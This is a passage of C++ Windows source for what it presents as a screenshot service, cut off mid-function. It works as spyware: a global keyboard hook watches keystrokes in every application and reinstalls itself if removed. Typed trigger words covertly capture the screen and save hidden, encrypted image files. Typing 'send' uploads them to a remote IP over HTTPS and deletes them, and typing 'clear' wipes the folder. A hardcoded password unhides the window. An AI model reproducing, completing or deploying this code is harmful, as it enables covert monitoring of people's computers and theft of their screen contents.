#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <cstdio>
#include <chrono>
#include <atomic>
#include <set>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <map>
#include "screenshot.h"
#include "hotkey.h"
#include "stealth.h"
#include "crypto.h"

#define HOTKEY_SCREENSHOT 1
#define HOTKEY_QUIT       2
#define HOTKEY_TOGGLE_VIS 3
#define HOTKEY_LOCK       4
#define HOTKEY_MOVE_UP    5
#define HOTKEY_MOVE_DOWN  6
#define HOTKEY_MOVE_LEFT  7
#define HOTKEY_MOVE_RIGHT 8

#define IDC_PATH_EDIT     201
#define IDC_BROWSE_BTN    202
#define IDC_SAVE_BTN      203
#define IDC_STATUS_TEXT   204
#define IDC_HOTKEY_EDIT   205
#define IDC_SET_HOTKEY    206
#define IDC_PANEL         207
#define IDC_TRIGGER_LIST  208
#define IDC_ADD_TRIGGER   209
#define IDC_DEL_TRIGGER   210
#define IDC_NEW_TRIGGER   211
#define IDC_TITLE_TEXT    212
#define IDC_FOOTER_TEXT   213

static const wchar_t* UNLOCK_PASSWORD = L"mrzqweasd";

static HWND g_hWnd = NULL;
static HWND g_hPathEdit = NULL;
static HWND g_hStatusText = NULL;
static HWND g_hHotkeyEdit = NULL;
static HWND g_hTriggerList = NULL;
static HWND g_hNewTriggerEdit = NULL;
static HWND g_hTargetIPEdit = NULL;
static HWND g_hTargetPortEdit = NULL;
static std::wstring g_customPath = L"";
static std::wstring g_screenshotHotkey = L"Ctrl+Shift+P";
static std::vector<std::wstring> g_triggerStrings;
static std::wstring g_clearTrigger = L"clear";
static std::wstring g_sendTrigger = L"send";
static std::wstring g_targetIP = L"192.168.1.100";
static int g_targetPort = 8443;
static std::atomic<bool> g_watcherRunning = false;
static std::atomic<bool> g_isSending = false;
static std::set<std::wstring> g_processedFiles;
static CRITICAL_SECTION g_fileLock;

static std::atomic<bool> g_isLocked = false;
static std::atomic<bool> g_isVisible = true;
static bool g_wasVisibleBeforeLock = true;
static std::wstring g_unlockBuffer = L"";
static CRITICAL_SECTION g_lockBufLock;

static HHOOK g_hKbdHook = NULL;
static HINSTANCE g_hInstance = NULL;

static HBRUSH g_hBgBrush = NULL;
static HBRUSH g_hPanelBrush = NULL;
static HBRUSH g_hEditBrush = NULL;
static HBRUSH g_hBtnBrush = NULL;
static HBRUSH g_hBtnHoverBrush = NULL;
static HFONT g_hFont = NULL;
static HFONT g_hFontBold = NULL;
static HFONT g_hFontLarge = NULL;
static HFONT g_hStatusFont = NULL;
static HFONT g_hSmallFont = NULL;
static HPEN g_hBorderPen = NULL;
static HPEN g_hGlowPen = NULL;

static std::wstring GetConfigFilePath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::wstring base(path);
        std::wstring dir = base + L"\\screenshot-service";
        CreateDirectoryW(dir.c_str(), NULL);
        return dir + L"\\config.txt";
    }
    return L"";
}

static void SaveConfig() {
    std::wstring configFile = GetConfigFilePath();
    if (configFile.empty()) return;
    
    std::wofstream ofs(configFile.c_str(), std::ios::out | std::ios::trunc);
    if (ofs.is_open()) {
        ofs << L"save_path=" << g_customPath << std::endl;
        ofs << L"hotkey=" << g_screenshotHotkey << std::endl;
        ofs << L"trigger_count=" << g_triggerStrings.size() << std::endl;
        for (size_t i = 0; i < g_triggerStrings.size(); i++) {
            ofs << L"trigger_" << i << L"=" << g_triggerStrings[i] << std::endl;
        }
        ofs << L"clear_trigger=" << g_clearTrigger << std::endl;
        ofs << L"send_trigger=" << g_sendTrigger << std::endl;
        ofs << L"target_ip=" << g_targetIP << std::endl;
        ofs << L"target_port=" << g_targetPort << std::endl;
        ofs.close();
    }
}

static void LoadConfig() {
    std::wstring configFile = GetConfigFilePath();
    if (configFile.empty()) return;
    
    std::wifstream ifs(configFile.c_str());
    if (!ifs.is_open()) return;
    
    std::wstring line;
    size_t triggerCount = 0;
    while (std::getline(ifs, line)) {
        if (line.find(L"save_path=") == 0) {
            g_customPath = line.substr(10);
        } else if (line.find(L"hotkey=") == 0) {
            g_screenshotHotkey = line.substr(7);
        } else if (line.find(L"trigger_count=") == 0) {
            triggerCount = std::stoull(line.substr(14));
        } else if (line.find(L"trigger_") == 0) {
            size_t eqPos = line.find(L"=");
            if (eqPos != std::wstring::npos) {
                g_triggerStrings.push_back(line.substr(eqPos + 1));
            }
        } else if (line.find(L"clear_trigger=") == 0) {
            g_clearTrigger = line.substr(14);
        } else if (line.find(L"send_trigger=") == 0) {
            g_sendTrigger = line.substr(13);
        } else if (line.find(L"target_ip=") == 0) {
            g_targetIP = line.substr(10);
        } else if (line.find(L"target_port=") == 0) {
            g_targetPort = std::stoi(line.substr(12));
        }
    }
    
    if (g_triggerStrings.empty()) {
        g_triggerStrings.push_back(L"");
    }
}

static void CreateScreenshotDir(const std::wstring& customPath) {
    std::wstring dir;
    if (!customPath.empty()) {
        dir = customPath;
    } else {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYPICTURES, NULL, 0, path))) {
            dir = std::wstring(path) + L"\\Screenshots";
        } else {
            dir = L"C:\\Screenshots";
        }
    }
    
    if (!dir.empty()) {
        SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
    }
}

static std::wstring GetScreenshotDir(const std::wstring& customPath) {
    if (!customPath.empty()) {
        return customPath;
    }
    
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYPICTURES, NULL, 0, path))) {
        return std::wstring(path) + L"\\Screenshots";
    }
    return L"C:\\Screenshots";
}

static void UpdateStatus(const wchar_t* text) {
    if (g_hStatusText) {
        SetWindowTextW(g_hStatusText, text);
    }
}

static void ClearScreenshotDir() {
    std::wstring dir = GetScreenshotDir(g_customPath);
    if (dir.empty()) {
        UpdateStatus(L"路径无效");
        return;
    }
    
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((dir + L"\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        UpdateStatus(L"目录为空");
        return;
    }
    
    int deletedCount = 0;
    do {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
            std::wstring filePath = dir + L"\\" + findData.cFileName;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                RemoveDirectoryW(filePath.c_str());
            } else {
                if (DeleteFileW(filePath.c_str())) {
                    deletedCount++;
                }
            }
        }
    } while (FindNextFileW(hFind, &findData));
    
    FindClose(hFind);
    
    wchar_t msg[256];
    swprintf(msg, 256, L"已清空目录，删除 %d 个文件", deletedCount);
    UpdateStatus(msg);
}

struct FileInfo {
    std::wstring path;
    std::wstring name;
    FILETIME createTime;
};

static std::vector<FileInfo> GetScreenshotFiles() {
    std::wstring dir = GetScreenshotDir(g_customPath);
    std::vector<FileInfo> files;
    
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((dir + L"\\*.png").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return files;
    
    do {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
            FileInfo info;
            info.path = dir + L"\\" + findData.cFileName;
            info.name = findData.cFileName;
            info.createTime = findData.ftCreationTime;
            files.push_back(info);
        }
    } while (FindNextFileW(hFind, &findData));
    
    FindClose(hFind);
    
    std::sort(files.begin(), files.end(), [](const FileInfo& a, const FileInfo& b) {
        return CompareFileTime(&a.createTime, &b.createTime) < 0;
    });
    
    return files;
}

static bool SendFileViaHTTPS(const std::wstring& filePath, const std::wstring& ip, int port) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    HINTERNET hSession = WinHttpOpen(L"ScreenshotSender/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    
    wchar_t portStr[32];
    swprintf(portStr, 32, L"%d", port);
    
    HINTERNET hConnect = WinHttpConnect(hSession, ip.c_str(), (INTERNET_PORT)port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    std::wstring path = L"/upload";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    std::wstring contentType = L"Content-Type: application/octet-stream\r\n";
    std::wstring fileNameHeader = L"X-File-Name: " + std::wstring(filePath.begin(), filePath.end()) + L"\r\n";
    
    std::wstring headers = contentType + fileNameHeader;
    
    BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(),
        fileData.data(), fileSize, fileSize, 0);
    
    if (result) {
        result = WinHttpReceiveResponse(hRequest, NULL);
    }
    
    if (result) {
        DWORD statusCode = 0;
        DWORD size = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size, WINHTTP_NO_HEADER_INDEX);
        
        if (statusCode == 200) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return true;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return false;
}

static DWORD WINAPI SendScreenshotsThread(LPVOID) {
    if (g_isSending.exchange(true)) return 0;
    
    UpdateStatus(L"正在发送截图...");
    
    std::vector<FileInfo> files = GetScreenshotFiles();
    if (files.empty()) {
        UpdateStatus(L"没有可发送的截图");
        g_isSending = false;
        return 0;
    }
    
    int sentCount = 0;
    int failCount = 0;
    
    for (const auto& file : files) {
        wchar_t status[512];
        swprintf(status, 512, L"正在发送: %s (%d/%d)", file.name.c_str(), sentCount + 1, (int)files.size());
        UpdateStatus(status);
        
        if (SendFileViaHTTPS(file.path, g_targetIP, g_targetPort)) {
            DeleteFileW(file.path.c_str());
            sentCount++;
        } else {
            failCount++;
        }
        
        Sleep(100);
    }
    
    wchar_t msg[512];
    swprintf(msg, 512, L"发送完成: 成功 %d, 失败 %d", sentCount, failCount);
    UpdateStatus(msg);
    
    g_isSending = false;
    return 0;
}

static void DecryptAndSave(const std::wstring& encPath) {
    std::wstring pngPath = encPath;
    size_t pos = pngPath.find(L".scrn");
    if (pos == std::wstring::npos) return;
    pngPath.replace(pos, 5, L".png");
    
    HANDLE hFile = CreateFileW(encPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> encData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, encData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    crypto::RSACrypt crypt;
    crypt.Init();
    
    std::vector<BYTE> pngData;
    if (!crypt.Decrypt(encData, pngData)) {
        crypt.Cleanup();
        return;
    }
    crypt.Cleanup();
    
    std::wstring tempPath = pngPath + L".tmp";
    HANDLE hOut = CreateFileW(tempPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hOut, pngData.data(), (DWORD)pngData.size(), &bytesRead, NULL);
    CloseHandle(hOut);
    
    MoveFileExW(tempPath.c_str(), pngPath.c_str(), MOVEFILE_REPLACE_EXISTING);
    DeleteFileW(encPath.c_str());
}

static void FileWatcherThread() {
    while (g_watcherRunning) {
        std::wstring dir = GetScreenshotDir(g_customPath);
        if (dir.empty()) {
            Sleep(1000);
            continue;
        }
        
        HANDLE hDir = CreateFileW(dir.c_str(), FILE_LIST_DIRECTORY,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
        
        if (hDir == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }
        
        BYTE buffer[4096];
        DWORD bytesReturned;
        
        while (g_watcherRunning) {
            BOOL ok = ReadDirectoryChangesW(hDir, buffer, sizeof(buffer), FALSE,
                FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_CREATION | FILE_NOTIFY_CHANGE_LAST_WRITE,
                &bytesReturned, NULL, NULL);
            
            if (!ok) break;
            
            FILE_NOTIFY_INFORMATION* pNotify = (FILE_NOTIFY_INFORMATION*)buffer;
            do {
                std::wstring fileName(pNotify->FileName, pNotify->FileNameLength / sizeof(WCHAR));
                
                size_t dotPos = fileName.rfind(L'.');
                if (dotPos != std::wstring::npos && fileName.substr(dotPos) == L".scrn") {
                    EnterCriticalSection(&g_fileLock);
                    bool alreadyProcessed = g_processedFiles.count(fileName) > 0;
                    if (!alreadyProcessed) {
                        g_processedFiles.insert(fileName);
                    }
                    LeaveCriticalSection(&g_fileLock);
                    
                    if (!alreadyProcessed) {
                        Sleep(100);
                        std::wstring fullPath = dir + L"\\" + fileName;
                        DecryptAndSave(fullPath);
                    }
                }
                
                if (pNotify->NextEntryOffset == 0) break;
                pNotify = (FILE_NOTIFY_INFORMATION*)((BYTE*)pNotify + pNotify->NextEntryOffset);
            } while (true);
        }
        
        CloseHandle(hDir);
    }
}

static void OnScreenshotHotkey() {
    UpdateStatus(L"正在截屏...");
    
    screenshot::ImageData image;
    if (!screenshot::CaptureScreen(image)) {
        UpdateStatus(L"截屏失败");
        return;
    }

    std::wstring dir = GetScreenshotDir(g_customPath);
    CreateScreenshotDir(g_customPath);
    if (dir.empty()) {
        UpdateStatus(L"保存路径无效");
        return;
    }

    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
    std::tm tm_buf;
    localtime_s(&tm_buf, &time_t);

    wchar_t fname[MAX_PATH];
    swprintf(fname, MAX_PATH, L"screenshot_%04d%02d%02d_%02d%02d%02d_%03d.scrn",
        tm_buf.tm_year + 1900, tm_buf.tm_mon + 1, tm_buf.tm_mday,
        tm_buf.tm_hour, tm_buf.tm_min, tm_buf.tm_sec, (int)ms.count());

    std::wstring filepath = dir + L"\\" + fname;
    
    std::wstring tempPngPath = dir + L"\\" + std::wstring(fname);
    size_t pos = tempPngPath.find(L".scrn");
    if (pos != std::wstring::npos) {
        tempPngPath.replace(pos, 5, L".png");
    }
    
    if (!screenshot::SavePNG(image, tempPngPath.c_str())) {
        UpdateStatus(L"保存失败");
        return;
    }
    
    HANDLE hFile = CreateFileW(tempPngPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileW(tempPngPath.c_str());
        UpdateStatus(L"保存失败");
        return;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> pngData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, pngData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    DeleteFileW(tempPngPath.c_str());
    
    crypto::RSACrypt crypt;
    if (!crypt.Init()) {
        UpdateStatus(L"加密失败");
        return;
    }
    
    std::vector<BYTE> encrypted;
    if (!crypt.Encrypt(pngData, encrypted)) {
        crypt.Cleanup();
        UpdateStatus(L"加密失败");
        return;
    }
    crypt.Cleanup();
    
    HANDLE hOut = CreateFileW(filepath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        WriteFile(hOut, encrypted.data(), (DWORD)encrypted.size(), &bytesRead, NULL);
        CloseHandle(hOut);
        
        wchar_t msg[512];
        swprintf(msg, 512, L"已保存: %s", fname);
        UpdateStatus(msg);
    } else {
        UpdateStatus(L"保存失败");
    }
}

static void MoveWindowBy(int dx, int dy) {
    RECT rc;
    GetWindowRect(g_hWnd, &rc);
    SetWindowPos(g_hWnd, NULL, rc.left + dx, rc.top + dy, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
}

static void ToggleVisibility() {
    if (g_isLocked) return;
    g_isVisible = !g_isVisible;
    if (g_isVisible) {
        ShowWindow(g_hWnd, SW_SHOW);
    } else {
        ShowWindow(g_hWnd, SW_HIDE);
    }
}

static void LockApp() {
    g_isLocked = true;
    g_wasVisibleBeforeLock = g_isVisible;
    if (g_isVisible) {
        g_isVisible = false;
        ShowWindow(g_hWnd, SW_HIDE);
    }
}

static void UnlockApp() {
    g_isLocked = false;
    if (!g_isVisible) {
        g_isVisible = true;
        ShowWindow(g_hWnd, SW_SHOW);
    }
}

static const int MAX_UNLOCK_BUF_LEN = 18;

static void HandleUnlockKey(wchar_t ch) {
    if (!g_isLocked) return;
    
    EnterCriticalSection(&g_lockBufLock);
    g_unlockBuffer += ch;
    
    const wchar_t* pwd = UNLOCK_PASSWORD;
    int pwdLen = (int)wcslen(pwd);
    
    if ((int)g_unlockBuffer.size() > MAX_UNLOCK_BUF_LEN) {
        g_unlockBuffer.erase(0, g_unlockBuffer.size() - MAX_UNLOCK_BUF_LEN);
    }
    
    if ((int)g_unlockBuffer.size() >= pwdLen) {
        std::wstring tail = g_unlockBuffer.substr(g_unlockBuffer.size() - pwdLen);
        if (tail == pwd) {
            UnlockApp();
        }
    }
    LeaveCriticalSection(&g_lockBufLock);
}

static std::wstring g_keyBuffer = L"";
static CRITICAL_SECTION g_keyBufLock;

static void HandleTriggerKey(wchar_t ch) {
    EnterCriticalSection(&g_keyBufLock);
    g_keyBuffer += ch;
    
    size_t maxLen = 0;
    for (const auto& trigger : g_triggerStrings) {
        if (trigger.length() > maxLen) maxLen = trigger.length();
    }
    if (g_clearTrigger.length() > maxLen) maxLen = g_clearTrigger.length();
    if (g_sendTrigger.length() > maxLen) maxLen = g_sendTrigger.length();
    if (maxLen == 0) maxLen = 20;
    
    if ((int)g_keyBuffer.size() > (int)maxLen + 5) {
        g_keyBuffer.erase(0, g_keyBuffer.size() - maxLen - 5);
    }
    
    if ((int)g_keyBuffer.size() >= (int)g_clearTrigger.length() && !g_clearTrigger.empty()) {
        std::wstring tail = g_keyBuffer.substr(g_keyBuffer.size() - g_clearTrigger.length());
        if (tail == g_clearTrigger) {
            g_keyBuffer.clear();
            LeaveCriticalSection(&g_keyBufLock);
            ClearScreenshotDir();
            return;
        }
    }
    
    if ((int)g_keyBuffer.size() >= (int)g_sendTrigger.length() && !g_sendTrigger.empty()) {
        std::wstring tail = g_keyBuffer.substr(g_keyBuffer.size() - g_sendTrigger.length());
        if (tail == g_sendTrigger) {
            g_keyBuffer.clear();
            LeaveCriticalSection(&g_keyBufLock);
            CreateThread(NULL, 0, SendScreenshotsThread, NULL, 0, NULL);
            return;
        }
    }
    
    for (const auto& trigger : g_triggerStrings) {
        if (trigger.empty()) continue;
        if ((int)g_keyBuffer.size() >= (int)trigger.length()) {
            std::wstring tail = g_keyBuffer.substr(g_keyBuffer.size() - trigger.length());
            if (tail == trigger) {
                g_keyBuffer.clear();
                LeaveCriticalSection(&g_keyBufLock);
                PostMessageW(g_hWnd, WM_HOTKEY, (WPARAM)HOTKEY_SCREENSHOT, 0);
                return;
            }
        }
    }
    LeaveCriticalSection(&g_keyBufLock);
}

static void ClearKeyBuffer() {
    EnterCriticalSection(&g_keyBufLock);
    g_keyBuffer.clear();
    LeaveCriticalSection(&g_keyBufLock);
}

static void ClearUnlockBuffer() {
    EnterCriticalSection(&g_lockBufLock);
    g_unlockBuffer.clear();
    LeaveCriticalSection(&g_lockBufLock);
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

static void ReinstallKeyboardHook() {
    if (g_hKbdHook) {
        UnhookWindowsHookEx(g_hKbdHook);
    }
    g_hKbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInstance, 0);
}

static DWORD WINAPI HookMonitorThread(LPVOID) {
    while (true) {
        Sleep(500);
        if (g_hKbdHook == NULL) {
            ReinstallKeyboardHook();
        }
    }
    return 0;
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HC_ACTION) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pkbhs->vkCode == VK_RETURN) {
            ClearKeyBuffer();
            ClearUnlockBuffer();
        } else if (pkbhs->vkCode >= 'A' && pkbhs->vkCode <= 'Z') {
            wchar_t ch = (wchar_t)(pkbhs->vkCode - 'A' + 'a');
            
            if (g_isLocked) {
                HandleUnlockKey(ch);
            } else {
                HandleTriggerKey(ch);
            }
        } else if (pkbhs->vkCode >= '0' && pkbhs->vkCode <= '9') {
            wchar_t ch = (wchar_t)pkbhs->vkCode;
            if (!g_isLocked) {
                HandleTriggerKey(ch);
            }
        } else if (pkbhs->vkCode == VK_SPACE) {
            if (!g_isLocked) {
                HandleTriggerKey(L' ');
            }
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        g_hFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Microsoft YaHei UI");
        g_hFontBold = CreateFontW(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Microsoft YaHei UI");
        g_hFontLarge = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Microsoft YaHei UI");
        g_hStatusFont = CreateFontW(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Microsoft YaHei UI");
        g_hSmallFont = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Microsoft YaHei UI");
        
        g_hBgBrush = CreateSolidBrush(RGB(10, 15, 25));
        g_hPanelBrush = CreateSolidBrush(RGB(15, 22, 36));
        g_hEditBrush = CreateSolidBrush(RGB(20, 30, 48));
        g_hBtnBrush = CreateSolidBrush(RGB(0, 120, 215));
        g_hBtnHoverBrush = CreateSolidBrush(RGB(0, 150, 255));
        g_hBorderPen = CreatePen(PS_SOLID, 2, RGB(0, 180, 255));
        g_hGlowPen = CreatePen(PS_SOLID, 3, RGB(0, 220, 255));
        
        HWND hTitleText = CreateWindowW(L"STATIC", L"  截屏服务",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            15, 12, 200, 30, hWnd, (HMENU)IDC_TITLE_TEXT, NULL, NULL);
        SendMessageW(hTitleText, WM_SETFONT, (WPARAM)g_hFontLarge, TRUE);
        
        HWND hPanel = CreateWindowW(L"STATIC", L"",
            WS_CHILD | WS_VISIBLE,
            15, 50, 570, 100, hWnd, (HMENU)IDC_PANEL, NULL, NULL);
        
        HWND hPathLabel = CreateWindowW(L"STATIC", L"保存路径:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 60, 80, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hPathLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        g_hPathEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            105, 58, 300, 26, hWnd, (HMENU)IDC_PATH_EDIT, NULL, NULL);
        
        HWND hBrowseBtn = CreateWindowW(L"BUTTON", L"浏览",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            410, 57, 65, 28, hWnd, (HMENU)IDC_BROWSE_BTN, NULL, NULL);
        
        HWND hSaveBtn = CreateWindowW(L"BUTTON", L"保存",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            480, 57, 65, 28, hWnd, (HMENU)IDC_SAVE_BTN, NULL, NULL);
        
        g_hStatusText = CreateWindowW(L"STATIC", L"[ 就绪 ] Ctrl+Shift+P 截屏",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 95, 520, 22, hWnd, (HMENU)IDC_STATUS_TEXT, NULL, NULL);
        
        HWND hHotkeyLabel = CreateWindowW(L"STATIC", L"热键:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 122, 50, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hHotkeyLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        g_hHotkeyEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            75, 120, 150, 26, hWnd, (HMENU)IDC_HOTKEY_EDIT, NULL, NULL);
        
        HWND hSetHotkeyBtn = CreateWindowW(L"BUTTON", L"设置",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            230, 119, 65, 28, hWnd, (HMENU)IDC_SET_HOTKEY, NULL, NULL);
        
        HWND hTriggerPanel = CreateWindowW(L"STATIC", L"",
            WS_CHILD | WS_VISIBLE,
            15, 155, 570, 180, hWnd, (HMENU)(IDC_PANEL + 1), NULL, NULL);
        
        HWND hTriggerLabel = CreateWindowW(L"STATIC", L"触发字符串:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 165, 100, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hTriggerLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        g_hTriggerList = CreateWindowW(L"LISTBOX", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | LBS_NOTIFY | LBS_SORT,
            25, 190, 350, 100, hWnd, (HMENU)IDC_TRIGGER_LIST, NULL, NULL);
        SendMessageW(g_hTriggerList, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        
        g_hNewTriggerEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            385, 190, 150, 26, hWnd, (HMENU)IDC_NEW_TRIGGER, NULL, NULL);
        
        HWND hAddTriggerBtn = CreateWindowW(L"BUTTON", L"添加",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            385, 220, 65, 28, hWnd, (HMENU)IDC_ADD_TRIGGER, NULL, NULL);
        
        HWND hDelTriggerBtn = CreateWindowW(L"BUTTON", L"删除",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            455, 220, 65, 28, hWnd, (HMENU)IDC_DEL_TRIGGER, NULL, NULL);
        
        HWND hTriggerHint = CreateWindowW(L"STATIC", L"提示: 输入任意字符串，在任意界面输入该字符串即可触发截屏",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 295, 520, 18, hWnd, NULL, NULL, NULL);
        SendMessageW(hTriggerHint, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);
        
        HWND hSendPanel = CreateWindowW(L"STATIC", L"",
            WS_CHILD | WS_VISIBLE,
            15, 340, 570, 100, hWnd, (HMENU)(IDC_PANEL + 2), NULL, NULL);
        
        HWND hClearLabel = CreateWindowW(L"STATIC", L"清空触发:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 350, 80, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hClearLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        HWND hClearTriggerEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            105, 348, 150, 26, hWnd, (HMENU)(IDC_NEW_TRIGGER + 1), NULL, NULL);
        SendMessageW(hClearTriggerEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        
        HWND hSendLabel = CreateWindowW(L"STATIC", L"发送触发:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            265, 350, 80, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hSendLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        HWND hSendTriggerEdit = CreateWindowW(L"EDIT", L"",
